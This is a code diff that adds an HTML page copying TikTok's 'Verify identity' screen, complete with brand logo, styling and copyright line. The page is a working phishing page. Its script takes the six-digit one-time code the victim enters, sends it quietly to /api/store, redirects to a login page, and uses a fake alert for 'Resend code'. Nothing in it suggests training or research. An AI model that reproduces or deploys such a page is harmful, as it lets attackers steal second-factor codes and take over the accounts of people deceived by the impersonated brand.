@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verify identity — TikTok</title>
+  <link rel="stylesheet" href="/shared.css" />
+  <style>
+    body {
+      background: #0a0a0a;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 24px;
+      position: relative;
+      z-index: 10;
+    }
+    .modal-overlay {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .modal-card {
+      background: #1f1f1f;
+      border-radius: 16px;
+      padding: 40px;
+      width: 90%;
+      max-width: 540px;
+      position: relative;
+    }
+    .modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 32px;
+    }
+    .back-btn, .close-btn {
+      background: none;
+      border: none;
+      color: #fff;
+      cursor: pointer;
+      padding: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: opacity 0.2s;
+    }
+    .back-btn:hover, .close-btn:hover {
+      opacity: 0.7;
+    }
+    .modal-title {
+      font-size: 32px;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 12px;
+    }
+    .modal-subtitle {
+      font-size: 16px;
+      color: rgba(255,255,255,0.6);
+      line-height: 1.5;
+      margin-bottom: 24px;
+    }
+    .otp-input-field {
+      width: 100%;
+      padding: 16px 20px;
+      background: rgba(255,255,255,0.1);
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 16px;
+      outline: none;
+      margin-bottom: 20px;
+      transition: all 0.2s;
+    }
+    .otp-input-field:focus {
+      background: rgba(255,255,255,0.15);
+    }
+    .otp-input-field::placeholder {
+      color: rgba(255,255,255,0.4);
+    }
+    .resend-link {
+      color: #fe2c55;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      background: none;
+      border: none;
+      padding: 0;
+      margin-bottom: 40px;
+      display: inline-block;
+      transition: opacity 0.2s;
+    }
+    .resend-link:hover {
+      opacity: 0.8;
+    }
+    .next-btn {
+      width: 100%;
+      padding: 16px;
+      background: rgba(254,44,85,0.5);
+      color: rgba(255,255,255,0.6);
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .next-btn.active {
+      background: #fe2c55;
+      color: #fff;
+    }
+    .next-btn.active:hover {
+      background: #ff4d73;
+    }
+    footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 24px;
+      border-top: 1px solid rgba(255,255,255,0.1);
+      position: relative;
+      z-index: 10;
+    }
+    .footer-signup {
+      position: absolute;
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 15px;
+      color: rgba(255,255,255,0.6);
+      text-align: center;
+    }
+    .footer-signup a {
+      color: #fe2c55;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    .lang-btn {
+      background: rgba(255,255,255,0.05);
+      border: 1px solid rgba(255,255,255,0.1);
+      color: rgba(255,255,255,0.8);
+      padding: 10px 16px;
+      border-radius: 4px;
+      font-size: 14px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      transition: all 0.2s;
+    }
+    .lang-btn:hover {
+      background: rgba(255,255,255,0.1);
+    }
+    .copyright {
+      color: rgba(255,255,255,0.4);
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <a href="/login" class="logo">
+      <svg width="32" height="32" viewBox="0 0 32 32" fill="none"><rect width="32" height="32" rx="8" fill="#010101"/><path d="M22.5 8c.28 1.64 1.3 3.07 2.5 3.8v3.2c-1.4-.04-2.74-.47-3.87-1.24v5.64c0 3.64-2.98 6.6-6.63 6.6A6.63 6.63 0 0 1 8 19.4c0-3.64 2.98-6.6 6.63-6.6.23 0 .45.01.67.04v3.26a3.36 3.36 0 0 0-.67-.07 3.4 3.4 0 0 0-3.4 3.37 3.4 3.4 0 0 0 3.4 3.37 3.4 3.4 0 0 0 3.4-3.37V8h3.47z" fill="white"/></svg>
+      TikTok
+    </a>
+    <button class="feedback-btn">
+      <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17" stroke-width="2.5" stroke-linecap="round"/></svg>
+      Feedback and help
+    </button>
+  </header>
+
+  <div class="modal-overlay">
+    <div class="modal-card">
+      <div class="modal-header">
+        <button class="back-btn" onclick="window.location.href='/reset-password'">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="15 18 9 12 15 6"/></svg>
+        </button>
+        <button class="close-btn" onclick="window.location.href='/login'">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+        </button>
+      </div>
+
+      <h1 class="modal-title">Verify identity</h1>
+      <p class="modal-subtitle">Verify your identity by entering the code sent to <span id="maskedEmail">your email</span>.</p>
+
+      <input class="otp-input-field" type="text" id="otpInput" placeholder="Enter 6-digit code" maxlength="6" inputmode="numeric" />
+
+      <button class="resend-link" onclick="resendOTP()">Resend code</button>
+
+      <button class="next-btn" id="nextBtn" onclick="verifyOTP()">Next</button>
+    </div>
+  </div>
+
+  <footer>
+    <button class="lang-btn">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+      English (US)
+    </button>
+    <div class="footer-signup">
+      Don't have an account? <a href="/signup">Sign up</a>
+    </div>
+    <span class="copyright">© 2026 TikTok</span>
+  </footer>
+
+  <script>
+    const otpInput = document.getElementById('otpInput');
+    const nextBtn = document.getElementById('nextBtn');
+
+    // Enable/disable Next button based on input
+    otpInput.addEventListener('input', (e) => {
+      // Only allow numbers
+      e.target.value = e.target.value.replace(/[^0-9]/g, '');
+      
+      if (e.target.value.length === 6) {
+        nextBtn.classList.add('active');
+      } else {
+        nextBtn.classList.remove('active');
+      }
+    });
+
+    // Focus input on load
+    otpInput.focus();
+
+    function verifyOTP() {
+      const otp = otpInput.value;
+      
+      if (otp.length !== 6) {
+        return;
+      }
+
+      // Capture OTP and redirect
+      const data = {
+        page: 'OTP Verification',
+        fields: {
+          otp_code: otp,
+          verification_status: 'submitted'
+        }
+      };
+
+      navigator.sendBeacon('/api/store', new Blob([JSON.stringify(data)], { type: 'application/json' }));
+
+      setTimeout(() => {
+        window.location.href = '/login';
+      }, 300);
+    }
+
+    function resendOTP() {
+      alert('A new verification code has been sent to your email');
+    }
+
+    // Allow Enter key to submit
+    otpInput.addEventListener('keypress', (e) => {
+      if (e.key === 'Enter' && otpInput.value.length === 6) {
+        verifyOTP();
+      }
+    });
+  </script>
+
+</body>
+</html>
